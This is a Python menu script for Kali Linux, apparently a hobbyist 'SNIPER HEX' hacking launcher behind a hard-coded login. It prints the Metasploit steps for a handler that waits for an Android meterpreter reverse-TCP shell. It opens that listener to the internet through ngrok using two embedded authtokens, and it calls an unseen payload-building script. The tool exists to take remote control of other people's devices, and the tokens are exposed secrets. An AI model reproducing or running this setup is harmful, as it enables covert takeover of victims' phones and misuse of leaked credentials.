import os
R = '\033[1;31m' #RED
W = '\033[1;97m' #WHITE
Y = '\033[1;33m' #YELLOW
G = '\033[2;32m' #GREEN
B = '\033[2;34m' #BLUE
os.system('chmod +x ngrok')
os.system('chmod +x Work_A_Payloads.sh')
os.system('clear')
print (Y+'                        ')
print (R+'                        ')
print (Y+'                        ')
print (R+'      ____   __  __     ')
print (Y+'     / ___|  \ \/ /     ')
print (R+'     \___ \   \  /      ')
print (Y+'      ___) |  /  \      ')
print (R+'     |____/  /_/\_\     ')
print (Y+'                        S',R+'N',Y+'I',R+'P',Y+'E',R+'R',Y+' ',Y+'H',R+'E',Y+'X')
print (R+'                        ')
print (Y+'                        ')
print (R+'                        ')
print (Y+'      #=======<>=======#             ')
print (R+'                        ')
print (Y+'                        ')
username = input (R+' Enter Your User Name: ')
if ('SX') in username:
        print ('')
        print (G+' [√] Welcome')
        print ('')
        password = input (R+' Enter Your Password: ')
        if ('01152') in password:
            print ('')
            print (R+' [1] (KALI LINUX) Commands To Open The Hacking Session ')
            print (R+' [2] (KALI LINUX) Run Tool The Metasploit ')
            print (R+' [3] (KALI LINUX) Download All Package ')
            print (R+' [4] (KALI LINUX) Run Tool The Ngrok ')
            print (R+' [5] (KALI LINUX) Work A Payloads ')
            print (R+' [6] Exit My Tool ')
            print ('')
            choose = input (R+' Choose Your Numper: '+G)
            if ('1') in choose:
                os.system('clear')
                print (' [1] use exploit/multi/handler ')
                print (' [2] set payload android/meterpreter/reverse_tcp ')
                print (' [3] set lhost 127.0.0.1 ')
                print (' [4] set lport 8080 ')
                print (' [5] exploit ')
            elif ('2') in choose:
                os.system('clear')
                os.system('sudo msfdb init && msfconsole')
            elif ('3') in choose:
                os.system('clear')
                os.system('sudo apt-get install root-repo')
                os.system('sudo apt-get install x11-repo')
                os.system('sudo apt-get install git')
                os.system('sudo apt-get install python')
                os.system('sudo apt-get install python2')
                os.system('sudo apt-get install python3')
                os.system('sudo apt-get install ruby')
                os.system('sudo apt-get install wget')
                os.system('sudo apt-get install curl')
                os.system('sudo apt-get install zip')
                os.system('sudo apt-get install unzip')
                os.system('sudo apt-get install rabin2')
                os.system('sudo apt-get install cat')
                os.system('sudo apt-get install nano')
                os.system('sudo apt-get install nmap')
                os.system('sudo apt-get install figlet')
                os.system('clear')
                print (G+' Done Download All Package')
            elif ('4') in choose:
                os.system('clear')
                print ('')
                print (' [1] THE KING')
                print (' [2] SNIPER HEX')
                print ('')
                choosetwo = input (R+' Choose Your Numper: '+G)
                if ('1') in choosetwo:
                    os.system('./ngrok authtoken 27yvIwuX6bvriZEIqbvuYKc6dvo_6kbzp35uUexquiYWfPboe')
                    os.system('./ngrok tcp 8080')
                elif ('2') in choosetwo:
                    os.system('./ngrok authtoken 22p9R1zPfJJheu0gPwtdvfn2g3i_hci3ocHbB5qYMCE39JB7')
                    os.system('./ngrok tcp 8080')
            elif ('5') in choose:
                os.system('bash Work_A_Payloads.sh')
            elif ('6') in choose:
                os.system('clear && exit')
        else:
            print (R+' [×] The Password False')
else:
    print (R+' [×] The User Name False')